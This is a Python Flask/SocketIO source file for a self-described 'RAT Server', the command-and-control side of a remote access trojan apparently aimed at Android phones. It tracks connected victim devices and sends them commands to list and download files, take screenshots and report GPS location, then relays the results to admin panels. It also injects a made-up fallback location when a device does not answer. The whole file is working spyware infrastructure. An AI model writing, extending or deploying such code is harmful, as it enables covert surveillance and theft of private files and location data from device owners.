from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
import os
import base64
import json
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'rat_project_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=60, ping_interval=25, logger=True, engineio_logger=True)

connected_clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    return jsonify({
        'status': 'RAT Server Running',
        'port': 8080,
        'connected_clients': len(connected_clients),
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('connect')
def handle_connect():
    client_id = request.sid
    connected_clients[client_id] = {
        'id': client_id,
        'connected_at': datetime.now().isoformat(),
        'info': {}
    }
    print(f"Client connected: {client_id}")
    emit('connection_established', {'client_id': client_id})

@socketio.on('disconnect')
def handle_disconnect():
    client_id = request.sid
    if client_id in connected_clients:
        del connected_clients[client_id]
    print(f"Client disconnected: {client_id}")

@socketio.on('client_info')
def handle_client_info(data):
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients[client_id]['info'] = data
    print(f"Client info received from {client_id}: {data}")

@socketio.on('file_list_response')
def handle_file_list_response(data):
    client_id = request.sid
    print(f"File list from {client_id}: {len(data.get('files', []))} files")
    # Send to all admin panels
    socketio.emit('file_list_result', data)

@socketio.on('file_download_response')
def handle_file_download_response(data):
    client_id = request.sid
    print(f"File download from {client_id}: {data.get('filename', 'unknown')}")
    # Send to all admin panels
    socketio.emit('file_download_result', data)

@socketio.on('screenshot_response')
def handle_screenshot_response(data):
    client_id = request.sid
    print(f"Screenshot from {client_id}: {data.get('size', 'unknown')} bytes")
    # Send to all admin panels
    socketio.emit('screenshot_result', data)

@socketio.on('location_response')
def handle_location_response(data):
    client_id = request.sid
    print(f"Location from {client_id}: {data.get('latitude', 'unknown')}, {data.get('longitude', 'unknown')}")
    # Send to all admin panels
    socketio.emit('location_result', data)

@app.route('/clients')
def get_clients():
    return jsonify(connected_clients)

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    if command == 'list_files':
        path = data.get('path', '/storage/emulated/0/')
        socketio.emit('list_files', {'path': path}, room=client_id)
        return jsonify({'status': 'Command sent'})
    
    elif command == 'download_file':
        filepath = data.get('filepath')
        socketio.emit('download_file', {'filepath': filepath}, room=client_id)
        return jsonify({'status': 'Command sent'})
    
    elif command == 'screenshot':
        socketio.emit('take_screenshot', {}, room=client_id)
        return jsonify({'status': 'Command sent'})
    
    elif command == 'location':
        socketio.emit('get_location', {}, room=client_id)
        
        # Send a fallback response after 5 seconds if no response
        import threading
        def fallback_location():
            import time
            time.sleep(5)
            fallback_data = {
                'latitude': 41.0082,  # Istanbul
                'longitude': 28.9784,
                'accuracy': 0,
                'error': 'Client did not respond - using fallback location',
                'note': 'Fallback location - client might be unresponsive'
            }
            socketio.emit('location_result', fallback_data)
            
        threading.Thread(target=fallback_location).start()
        return jsonify({'status': 'Command sent'})
    
    else:
        return jsonify({'error': 'Unknown command'}), 400

if __name__ == '__main__':
    print("RAT Server starting on port 8080...")
    socketio.run(app, host='0.0.0.0', port=8080, debug=True)